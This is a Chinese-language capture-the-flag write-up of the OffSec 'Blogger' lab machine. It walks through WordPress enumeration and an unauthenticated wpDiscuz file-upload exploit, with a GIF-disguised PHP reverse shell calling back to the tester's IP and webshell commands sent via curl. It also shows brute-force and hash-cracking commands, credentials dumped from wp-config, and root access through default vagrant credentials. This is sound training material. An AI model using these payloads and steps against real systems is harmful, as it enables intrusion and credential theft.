# Blogger 靶機滲透測試紀錄

> [!info] **靶機基本資訊**
> - **平台**：OffSec Proving Grounds (Play)
> - **作業系統**：Linux
> - **難易度**：Easy
> - **整理時間**：2026-07-04

---

## 🔍 1. 偵察與列舉 (Reconnaissance & Enumeration)

### 🚀 連接埠掃描 (RustScan & Nmap)
使用 RustScan 快速定位開放的連接埠，並使用 Nmap 掃描服務版本與預設腳本：
```bash
┌──(kali㉿kali)-[~/Desktop/playground/Amaterasu]
└─$ rustscan -a 192.168.182.217 -- -sV

.........

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**掃描結果整理：**

| 連接埠 (Port) | 服務 (Service) | 版本 (Version)         | 備註 / 潛在漏洞點          |
| ---------- | ------------ | -------------------- | ------------------- |
| 22/tcp     | SSH          | OpenSSH 7.2p2 Ubuntu | 遠端管理服務。             |
| 80/tcp     | HTTP         | Apache httpd 2.4.18  | Web 伺服器，呈現 `Blogger |

---

### 🌐 網頁服務列舉 (Web Enumeration)

#### 📁 目錄爆破 (Gobuster)
使用 Gobuster 爆破網頁目錄：
```bash
┌──(kali㉿kali)-[~/Desktop/playground/Amaterasu]
└─$ gobuster dir -u http://192.168.182.217/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50 -b 403,404
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.182.217/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
assets               (Status: 301) [Size: 319] [--> http://192.168.182.217/assets/]
css                  (Status: 301) [Size: 316] [--> http://192.168.182.217/css/]
images               (Status: 301) [Size: 319] [--> http://192.168.182.217/images/]
index.html           (Status: 200) [Size: 46199]
index.html           (Status: 200) [Size: 46199]
js                   (Status: 301) [Size: 315] [--> http://192.168.182.217/js/]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```
**發現的敏感路徑：**
*   `/assets/` (狀態碼: 301)
*   探索 `/assets/` 目錄，發現子目錄 `/assets/fonts/blog/`，這是一個 WordPress 網站。

	![](image/Pasted%20image%2020260704223618.png)
	![](image/Pasted%20image%2020260704223706.png)
	![](image/Pasted%20image%2020260704223745.png)
	```bash
	┌──(kali㉿kali)-[~/Desktop/playground/Amaterasu]
	└─$ whatweb http://192.168.182.217/assets/fonts/blog/
	http://192.168.182.217/assets/fonts/blog/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.182.217], MetaGenerator[WordPress 4.9.8], PoweredBy[WordPress,], Script[text/javascript], Title[Blogger &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.9.8]
	```

#### 📝 本地 Hosts 檔案解析
由於該 WordPress 網站的多個靜態資源連結與跳轉會導向 `blogger.pg`，需在 Kali 的 `/etc/hosts` 中加入以下解析：
```text
192.168.243.90 blogger.pg
```
![](image/Pasted%20image%2020260704223928.png)

#### 🔍 WordPress 漏洞與使用者列舉 (WPScan)
對 WordPress 目錄進行枚舉掃描：
```bash
┌──(kali㉿kali)-[~/Desktop/playground/Amaterasu]
└─$ wpscan --url http://blogger.pg/assets/fonts/blog/ -e u,ap --plugins-detection aggressive
```
**發現的重要資訊：**
1.  **使用者列舉**：發現有效使用者帳號 `j@m3s` (以及在 wp-login.php 輸入測試密碼確認帳號存在，而 `jm3s` 則為無效帳號)。
	```bash
	[+] Enumerating Users (via Passive and Aggressive Methods)
	 Brute Forcing Author IDs - Time: 00:00:00 <==========================> (10 / 10) 100.00% Time: 00:00:00
	
	[i] User(s) Identified:
	
	[+] j@m3s
	 | Found By: Author Posts - Display Name (Passive Detection)
	 | Confirmed By:
	 |  Rss Generator (Passive Detection)
	 |  Login Error Messages (Aggressive Detection)
	
	[+] jm3s
	 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
	```

	![](image/Pasted%20image%2020260704225518.png)
	![](image/Pasted%20image%2020260704225619.png)
2.  **XML-RPC 啟用**：`xmlrpc.php` 接口可用，可用於對 `j@m3s` 帳號進行暴力破解。
	```bash
	[+] XML-RPC seems to be enabled: http://blogger.pg/assets/fonts/blog/xmlrpc.php
	 | Found By: Link Tag (Passive Detection)
	 | Confidence: 100%
	 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
	 | References:
	 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
	 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
	 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
	 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
	 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
	```
3.  **啟用外掛**：發現啟用 `wpDiscuz 7.0.4` 留言板外掛，該版本存在未授權任意檔案上傳漏洞。
	```bash
	[+] Enumerating All Plugins (via Aggressive Methods)
	 Checking Known Locations - Time: 00:39:54 <==================> (124198 / 124198) 100.00% Time: 00:39:54
	[+] Checking Plugin Versions (via Passive and Aggressive Methods)
	
	[i] Plugin(s) Identified:
	
	[+] akismet
	 | Location: http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/
	 | Last Updated: 2026-04-23T22:34:00.000Z
	 | Readme: http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
	 | [!] The version is out of date, the latest version is 5.7
	 |
	 | Found By: Known Locations (Aggressive Detection)
	 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/, status: 200
	 |
	 | Version: 4.0.8 (100% confidence)
	 | Found By: Readme - Stable Tag (Aggressive Detection)
	 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
	 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
	 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
	
	[+] wpdiscuz
	 | Location: http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/
	 | Last Updated: 2026-07-03T10:34:00.000Z
	 | Readme: http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
	 | [!] The version is out of date, the latest version is 7.6.59
	 |
	 | Found By: Known Locations (Aggressive Detection)
	 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200
	 |
	 | Version: 7.0.4 (80% confidence)
	 | Found By: Readme - Stable Tag (Aggressive Detection)
	 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
	```

#### 🔑 XML-RPC 密碼暴力破解嘗試 (嘗試但未完成)
得知 `xmlrpc.php` 啟用後，可使用 `wpscan` 針對 `j@m3s` 用戶進行密碼暴力破解：
```bash
wpscan --url http://blogger.pg/assets/fonts/blog/ --password-attack xmlrpc -t 20 -U j@m3s -P /usr/share/wordlists/rockyou.txt
```
> [!note] **實戰備註**
> 此為 Writeup 中嘗試過的路徑。由於暴力破解速度較慢，且隨後發現 `wpDiscuz` 外掛存在免認證檔案上傳漏洞（不需登入即可 RCE），且後續在 MySQL 資料庫中能直接提取並破譯該 Hash，因此本爆破指令在實戰中被中途停止，非初始存取的主要路徑。

---

## ⚡ 2. 漏洞分析與初始存取 (Vulnerability Analysis & Initial Access)

### 🕵️ 漏洞分析 (Vulnerability Assessment)
*   **外掛漏洞**：`wpDiscuz 7.0.4` 存在未授權任意檔案上傳漏洞（CVE-2020-24186）。
*   **利用點**：在部落格預設文章 "Hello world!" 的評論區塊中，有圖片上傳的功能。該功能雖然在前端與後端限制了僅允許上傳圖片檔案（MIME 類型），但我們可以直接在 PHP Reverse Shell 檔案的最前端加上 GIF Magic Number 來進行繞過。

---

### 🔑 初始存取突破 (Exploitation)

#### 方法 A：手動上傳與 Magic Number 繞過
1.  **準備 PHP Reverse Shell 並加上 Magic Number**：
    複製 Pentest Monkey 的 PHP 反彈 Shell，並在檔案首行加入 `GIF89a;` 以偽裝成 GIF 圖片：
	```php
	┌──(kali㉿kali)-[~/Desktop/playground/Blogger]
	└─$ cat shell.php                                           
	GIF89a;
	<?php
	// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
	// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
	
	set_time_limit (0);
	$VERSION = "1.0";
	$ip = '192.168.45.239';
	$port = 4444;
	$chunk_size = 1400;
	$write_a = null;
	$error_a = null;
	$shell = 'uname -a; w; id; sh -i';
	$daemon = 0;
	$debug = 0;
	...
	```
    將檔案命名為 `shell.php`。

2.  **上傳惡意 Shell**：
    在評論區的圖片上傳功能中，選擇此 `shell.php` 上傳。由於加入了 GIF 簽名，系統將其識別為合法圖片而上傳成功。
    ![](image/Pasted%20image%2020260704232330.png)
    ![](image/Pasted%20image%2020260704232751.png)

3.  **獲取 Shell 路徑並觸發**：
    *   在 Kali 開啟監聽器
    *   直接點及圖片(或 `curl` 圖片網址)，即可成功收到反彈 Shell，取得 `www-data` 初始系統權限。

#### 方法 B：使用 Searchsploit 漏洞利用指令碼 (Exploit-DB 49967.py)
我們也可以使用 Searchsploit 下載已知的 Python 自動化利用程式碼（CVE-2020-24186）來直接上傳 Webshell：

1. **搜尋並下載漏洞利用程式碼**：
   ```bash
   ┌──(kali㉿kali)-[~/Desktop/playground/Blogger]
   └─$ searchsploit wpDiscuz 7.0.4    
   ---------------------------------------------------------------------- ---------------------------------
    Exploit Title                                                        |  Path
   ---------------------------------------------------------------------- ---------------------------------
   Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthentica | php/webapps/49962.sh
   WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthentica | php/webapps/49967.py
   Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary File Uplo | php/webapps/49401.rb
   ---------------------------------------------------------------------- ---------------------------------
   
   ┌──(kali㉿kali)-[~/Desktop/playground/Blogger]
   └─$ searchsploit -m php/webapps/49967.py
     Exploit: WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)
         URL: https://www.exploit-db.com/exploits/49967
        Path: /usr/share/exploitdb/exploits/php/webapps/49967.py
       Codes: CVE-2020-24186
    Verified: False
   File Type: Python script, Unicode text, UTF-8 text executable, with very long lines (864)
   Copied to: /home/kali/Desktop/playground/Blogger/49967.py
   ```

2. **執行利用指令上傳 Webshell**：
   執行腳本並帶入 WordPress URL 目標 (`-u`) 與文章參數路徑 (`-p`，例如 `/?p=27` 參數)：
   ```bash
   ┌──(kali㉿kali)-[~/Desktop/playground/Blogger]
   └─$ python3 49967.py -u http://blogger.pg/assets/fonts/blog -p /?p=27
   ---------------------------------------------------------------
   [-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
   [-] File Upload Bypass Vulnerability - PHP Webshell Upload
   [-] CVE: CVE-2020-24186
   [-] https://github.com/hevox
   --------------------------------------------------------------- 
   
   [+] Response length:[60208] | code:[200]
   [!] Got wmuSecurity value: 6a4eafa54f
   [!] Got wmuSecurity value: 27 
   
   [+] Generating random name for Webshell...
   [!] Generated webshell name: qfkjkwpmczdlxml
   
   [!] Trying to Upload Webshell..
   [+] Upload Success... Webshell path:url&quot;:&quot;http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/07/qfkjkwpmczdlxml-1783191671.2089.php&quot; 
   
   > whoami
   
   [x] Failed to execute PHP code...
   ```
   *註：腳本自帶的 RCE 互動介面可能會提示執行失敗，但這不影響 Webshell 已成功上傳到主機上。*

3. **存取與觸發 Shell**：
   手動對腳本所給出的 Webshell 路徑發送含有執行指令的 `curl` 請求：
   ```bash
   ┌──(kali㉿kali)-[~/Desktop/playground/Blogger]
   └─$ curl http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/07/qfkjkwpmczdlxml-1783191671.2089.php?cmd=whoami                                 
   GIF689a;
   
   www-data
   ```
   確定 Webshell 能正常運作後，即可藉此傳入 Reverse Shell 指令或直接連線取得穩定互動 Shell。

#### 通用初始存取 Shell 獲取：
```bash
┌──(kali㉿kali)-[~/Desktop/playground/Blogger]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.239] from (UNKNOWN) [192.168.182.217] 35704
Linux ubuntu-xenial 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
15:25:43 up  1:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ find / -type f -name local.txt 2>/dev/null
/home/james/local.txt
```

成功於 `/home/james/local.txt` 取得第一個 Flag。

---

## 📈 3. 特權提升 (Privilege Escalation)

### 🕵️ 本地資訊收集 (Local Enumeration)
1.  **設定檔洩漏**：
    在 `/var/www/html/assets/fonts/blog/wp-config.php` 中尋找，獲得 MySQL 的 root 資料庫密碼。
	```bash
	$ find / -type f -name wp-config.php 2>/dev/null
	/var/www/wordpress/assets/fonts/blog/wp-config.php
	$ cat /var/www/wordpress/assets/fonts/blog/wp-config.php
	
	........
	
	/** The name of the database for WordPress */
	define('DB_NAME', 'wordpress');
	
	/** MySQL database username */
	define('DB_USER', 'root');
	
	/** MySQL database password */
	define('DB_PASSWORD', 'sup3r_s3cr3t');
	
	/** MySQL hostname */
	define('DB_HOST', 'localhost');
	```
1.  **MySQL 數據庫 Hash 提取**：
    登入本地 MySQL，並將 `wp_users` 的 Hash 傾倒出來：
	```bash
	$ SHELL=/bin/bash script -q /dev/null
	www-data@ubuntu-xenial:/$ mysql -u root -p
	mysql -u root -p
	Enter password: sup3r_s3cr3t
	
	........
	
	MariaDB [(none)]> show databases;
	show databases;
	+--------------------+
	| Database           |
	+--------------------+
	| information_schema |
	| mysql              |
	| performance_schema |
	| wordpress          |
	+--------------------+
	4 rows in set (0.01 sec)
	
	MariaDB [(none)]> use wordpress;
	use wordpress;
	Reading table information for completion of table and column names
	You can turn off this feature to get a quicker startup with -A
	
	Database changed
	MariaDB [wordpress]> show tables;
	show tables;
	+-----------------------------+
	| Tables_in_wordpress         |
	+-----------------------------+
	| ...........                 |
	| wp_users                    |
	| ...........                 |
	+-----------------------------+
	19 rows in set (0.00 sec)
	
	MariaDB [wordpress]> select * from wp_users;
	select * from wp_users;
	+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
	| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name |
	+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
	|  1 | j@m3s      | $P$BqG2S/yf1TNEu03lHunJLawBEzKQZv/ | jm3s          | admin@blogger.thm |          | 2021-01-17 12:40:06 |                     |           0 | j@m3s        |
	+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
	1 row in set (0.00 sec)
	```
   
    讀取到 `j@m3s` 的 WordPress MD5 Hash 後，可將其存至本地，並利用 `hashcat` 進行破解：
    ```bash
    hashcat -m 400 -a 0 hash.txt rockyou.txt --force
    ```

	太久了!! 尋找其他途徑(更新：密碼不在 `rockyou.txt` ，是兔子洞)

---

### 👑 提權利用 (Exploitation to Root)
*   **Vagrant 預設憑證漏洞 (非預期路徑)**：
    *   在檢視 `/etc/passwd` 發現本地用戶中存在 `vagrant`。
		```bash
		www-data@ubuntu-xenial:/$ cat /etc/passwd | grep sh
		cat /etc/passwd | grep sh
		root:x:0:0:root:/root:/bin/bash
		sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
		vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
		ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
		james:x:1002:1002:James M Brunner,,,:/home/james:/bin/bash
		```
    *   由於該 VM 是由 Vagrant 虛擬化平台打包而成，測試該用戶是否使用預設的 `vagrant:vagrant` 密碼。
    *   在 Shell 中執行切換用戶：
		```bash
		www-data@ubuntu-xenial:/$ su vagrant
		su vagrant
		Password: vagrant
		
		vagrant@ubuntu-xenial:/$ 
		```
        切換成功！
    *   執行 `sudo -l` 發現 `vagrant` 用戶具有 NOPASSWD 的 root 執行權限：
		```bash
		vagrant@ubuntu-xenial:/$ sudo -l
		sudo -l
		Matching Defaults entries for vagrant on ubuntu-xenial:
		    env_reset, mail_badpass,
		    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
		
		User vagrant may run the following commands on ubuntu-xenial:
		    (ALL) NOPASSWD: ALL
		```
    *   直接執行提權指令獲取最高 root 權限：
		```bash
		vagrant@ubuntu-xenial:/$ sudo su
		sudo su
		root@ubuntu-xenial:/# whoami
		whoami
		root
		root@ubuntu-xenial:/# find / -type f -name proof.txt 2>/dev/null
		find / -type f -name proof.txt 2>/dev/null
		/root/proof.txt
		```

成功於 `/root/proof.txt` 取得 root 權限與最後的 Flag。

---

# 實戰關聯
* [[Blogger]]
